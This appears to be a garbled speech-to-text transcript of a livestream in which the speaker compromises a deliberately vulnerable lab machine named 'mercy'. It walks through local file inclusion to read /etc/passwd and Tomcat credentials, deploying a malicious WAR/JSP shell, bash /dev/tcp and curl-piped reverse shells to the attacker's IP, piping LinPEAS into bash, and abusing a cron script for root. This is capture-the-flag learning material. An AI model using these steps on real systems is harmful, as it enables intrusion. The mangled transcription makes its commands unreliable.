all again when i to 168 48 134 let's just do all the ports it didn't take that long I like having one big and matte file that's clean so let's see do we have Thunderbird installed now sure open up Thunderbird let's see qy u qi u at 192 168 30 where's the IP 48 134 password of password login let's see incoming IMAP this will be pop3 because pop was open I don't think IMAP was pretty test doesn't look like this works let's see do I do these things at night or whatever I feel like doing the Box probably whenever I feel like while everyone stuck at home over the week I decided I just stream Saturday nights because it's not like we can be going out anyways see Tomcat s3c ret nope I'm waiting for this and map to finish right now let's see did go Buster PHP have anything just time in server status see shell-shocked didn't have anything let's look at all ports so we're doing 80 and 22 now it does have IMAP we try brute-forcing away into 8080 that didn't work let's see SMB stuff I guess we could try Viette see host and we'll do one I to 168 48 134 and this will be mercy because that's the hostname just go to mercy HTTP mercy same thing let's see what else is in the end map let's see Tomcats nothing too interesting it is port 8009 open the a JP port maybe we'll do something interesting with that all ports 8009 is not open oh there's a robot start text I guess that directory list doesn't have robust a text in it robots.txt disallow slash mercy and no mercy mercy index plead for mercy too much please help us upgrade a website no mercy rips search point rips let's see LF I wait - m2 mirror let's look at what this is let's see code PHP sweet let's try this windows co dot php' copy instead of index dot PHP let's try Etsy passwd and we got lfi sweet so let's see fluffy soup the long user plead plead for mercy v users text actually let's put these yeah we can do it uses here plead for mercy qyu okay um this is a Linux box so eternal blue won't work at all so what other things can we get let's see let's look at time bird dub dub dub HTML time C Sunday April 5th that is today's time I wonder we can do I wanted that's a PHP script and this LF I is executing code PHP filter convert base64 - encode slash resource is equal to that awesome let's view the source so I was hoping the source would be easier to copy echo - n paste base64 - D let's get rid of this one space so that's not that let's see let's go back in SMB config oh I know what we can do we can go into port 8080 and probably take the tomcat users so let's try this um please don't put spoilers in the chat or something let's try this okay - on page 64 - Dee sweet so we have a few users let's try SS aging with them 168 48 134 failed Urbana is pretty effective fluffy nothing but I guess we can upload a malicious Java file to this Tomcat so let's go to Tomcat C manager web app SuperDuper long user and we'll put the password there we go so now we just have to create a war file so let's see well go to the chat do we do MSF venom or Google how to do this manually so we're saying what people want to do right now it's the msf venom - test list is it - - P Lutz list - L - P - L one venom venom venom venom okay most people saying venom now most people saying Google someone wants to cake and eat it too saying both eventually I want to sleep so I probably won't do both let's going up the NMS a venom command anyways so let's do create malicious war file and I got to give myself the name server I want to help many guys it takes me to find one that's not doing Metasploit see another one using Metasploit let's see payload all the things let's try this see I should have this on my box find out grab - I wore Java Tomcat maybe it's not on payload all the things let's just create this payload and see what it's doing so I'm going to create this war file using MSI venom and then we're going to extract it and analyze exactly what it does so we got shell dot war war files are just zips so make to analyze and all this command did was MSF venom the payload Java JSP shell reverse TCP and we have to change el host and el port eventually but I just wanted to analyze it so it's going to create a JSP file and if we do up to payload all the things find grep JSP - i JSP don't see it so let's look at what this JSP file is so let's see it's importing the Java libraries and then this is creating a network stack the stream connector and then if windows if it is not windows the string is going to be been SH if it is windows it's going to be cmd.exe and then it's going to create the reverse shell to this IP so if we go into web n what is this web.xml it's just a welcome file list so let's Google JSP shell to see if we can make it execute a command simple JSP shell see this is using windows I don't want windows I'm just going to edit my Network real quick ipv4 DNS is there DNS is there let's see and resolve Kampf name server chmod or a CH attr is it - I oh it changed it before I even could do that is it plus I to make it immutable there we go we can no longer write this file so nothing will be changing it back so I made a typo when I did that there we go we can probably use this one get runtime let's see what this does so we're going to edit this set paste face this JSP shell and then if we remove showed up were let's see file it's just a zip so let's do maybe zip analyze star analyze dot zip okay we've all I have to do - are for recursive there we go so we added the web.xml so let's just upload this new war file that we created and see if it works was it that easy to create route phone hub Thank You Lloyd for the donation analyze dot zip deploy it must be a war so we upload this and let's see if it works for for let's see make dirt em I think it's because we have the parent directory up here so unzip this yeah so let's try going in this directory zip - are analyzed zip are the current self so now we no longer have a parent directory before that ok and let's go back we can unde apply browse upload Who am I and we can do a command so there you go you kind of got booth you got MSF venom generating over shell and then edging that shell putting a command in it or a different shell and yeah so you kind of got the best of both worlds there I guess so we'll do bash - see bash - I to get a reverse shell dev tcp one i to 168 if config be zero east one and then we'll do point 9001 that is the command I just ran so well I'm going to run C bash - I dev tcp doesn't look like it worked let's see so cheat sheet Python PHP let's do this one see face it here first we want to change this to 192 168 48 132 9001 copy send and it looks like there may be IP tables something on let's do find / - I I P table who am i / @ c type f it looks like there may be some like bad characters because that grep didn't work so maybe the shell let's see I don't see anything on output so I think it's the shell actually so let's do make to dub dub dub and then we can do let's see which curl do we have it we do V shows SH fast - see - - I let's just make sure we get this correct I think I was typing it correct before but never know okay 192 168 48 132 nine thousand one two piggies one that looks correct now we can just do Python 3 - m HC p dot server and then we go back here curl 192 168 48.1 32 8,000 curled Sh was it Sheldon Sh okay - Oh Devon SH M shell SH and we can do bash dev sh m Zelda Sh I think I just saved let's see yeah I saved cold on SH damn turn it showed Sh this is why normally do this but in burp sweet cat dev sh m shelled out us h - dev sh m showed out us h and we finally got a show back so now let's begin the previs but before that Python - see and put PT y PT y dot spawn Bend bash st - y wrong - echo FG so now let's see CD Etsy SSH + ssh d underscore config so what I'm doing right now is I want to see if there's any like deny user commands because if it's denying like that this is a super don't do per long user then I know to try like su on that so it doesn't look like that works let's see what else should we look at I guess we can run Lyn peace so let's see P opt privilege escalation awesome sweet limpy's limpy's sh and 2 dub dub dub and then curl 192 168 48 134 8,000 Lin pssh piped over to bash Oh 132 not found I must have a typo copy-paste there we go so now it is looking I saw a password text I want to find that real quick home this is a super duper long user password text fight harder is that actually his password or is that taunting me I don't know let's try su - this is a super duper long user authentication failure just in case I type this wrong let's take that doubt out yes I prefer Lin pees over when a new because it does color coding so that's not the password let's do a search and see what we have so we could do a kernel exploit against this so but this is probably an old box I hate doing kernel exploits we can probably do that as an alternate path but see if there's anything else you should never take the easy route because then you lose track of what you do person that created it was trying to teach you knock D see Tomcat stuff Postgres so we may want to go into a database and look at passwords so I'm just going to paste and look later cron jobs it's all that live verts on this box maybe it just got installed by default for RFI's you really have to go out of your way in today's age to make that a thing because like PHP by default I think disables are Fi by default so you have to add it in the config to allow it see my sequel as well I don't know what 8005 is we get a lot of logins for it plead plea for mercy logs in quite a bit there's today no those are old I may use PS by eventually it's not one of the first things I do I thought 8009 was a JP not 8005 I could be wrong let's see ver dub dub pub see Samba secrets looking at all these set UID files it's looking like they are standard ones default nothing's really jumping out screen four five zero that's gotten own one if that's actually that version I don't know if Lin piece is actually checking screen version see reading by me but not warned writable or word readable see backup files nothing interesting web files we may want to look at how does time work passwords and logs that's try harder we already looked at that file so we enjoy logging in with fluffy so su - fluffy paste the password oh we got in how did use a fluffy who am I to do - shell password nothing fine / - user fluffy Joo devil what falls on this box cat - bass history nothing dot private cat secrets it's in the directory backup save echoing backup files time clock let's see root owns this and it's completely executable let's see touch / temp please subscribe CD dot secrets cat secrets try harder cat backup save Phee back up save touch rush tap let's see thanks for the super chat donations unless temp just checking if either those wrote let's do virgdav dub HTML LSL a time is only writable by dub dub dub data let's see 5117 got etsy crontab let's try going to time let's - la temp hey we got please subscribe so that was the time file or not time back to home now is private secrets time clock was please subscribe so now we can just let's just go back and try a chmod on VI so chmod plus s user bin VI CD Etsy alternatives VI then basic so probably in a minute or when we hit this page that will become a set UID let's see if we go back to Linux kernel previs and we go back to 2018 go to this one root shell dot C let me just copy this root shell we have GCC we do not that hasn't ran yet so let's do V shell dot C set paste GCC shell dot C - OH dub dub dub shell oh we're just call it shell still doesn't have that set UID bit W get 192 168 48.1 32 8000 shell does this execute chmod plus x shell you name - a this is 32-bit Ubuntu can you show how the box is executing the script as route I don't know yet so can't drop that it's probably just a con job though I thought I did hit the time page hit hit hit hitting this a few times LS l a user bin bin basic oh you do have to hit it it must have been in cache ID we are now route and we could do - M 32 shell X 32 maybe I probably have to install the libraries to do that the mercy box is on born hub so let's see so a few things we wanted to do let's look at how that time thing works real quick let's do contact - l verse pool is it cron CD cron tabs let's look at route so every three minutes this script gets it we probably could also hit this LS la only route can do that one so it wasn't hitting the web page I just didn't give it long enough so let's see what else do we want to do let's look at screen screen - v40 one that's me 2006 so screen is a fun exploit search point screen let's see oh this is going to want us to have GCC isn't it let's see yeah I'll have to install stuff to get 32-bit Ubuntu or something to get this one working let's see let's look at this file real quick so if fluffy couldn't have read that only route can so that's not a good one for dub dub dub pub does exist plead for mercy and probably not my sequel sequel - new route let's see verge of dub HTML so anything that would be my sequel nothing there no mercy config see find dot grep - I user pass MySQL well graph - are for recursive MySQL let's see config see maybe grab for password grep for three three or six let's see I'm not sure what my sequels passwords going to be let's see psql fluffy does not exist so let's figure out what is listening one Postgres maybe we aren't fluffy ID was still fluffy for a tomcat let's see let's do - writeable - LS we can't write to anything so I wonder if we could get a shell as dub-dub-dub - data and then do it we can try - capital u Postgres doesn't work CD HTML grep - or was it 5 4 3 2 let's see config file we read this les Etsy PostgreSQL nine three main I'm not sure let's just do the easy one and look at the colonel 2016 it's gonna be dirty Cal probably the downside is I don't want to build a 32-bit Ubuntu or download the 32-bit stuff so I can compile on Kali right now because it's getting late I'm sure I've done this on hack the box machines if you want a googol dirty cow and see how this works but based upon the year I'm guessing that's what it is so take care guys and I will see you all next week probably well I will I don't know if I'm gonna stream next week but I'll do a hack the box video of course so I'm gonna switch this to the starting soon thing because there's a delay I guess on the chat and we give this a few minutes and then I will end the stream you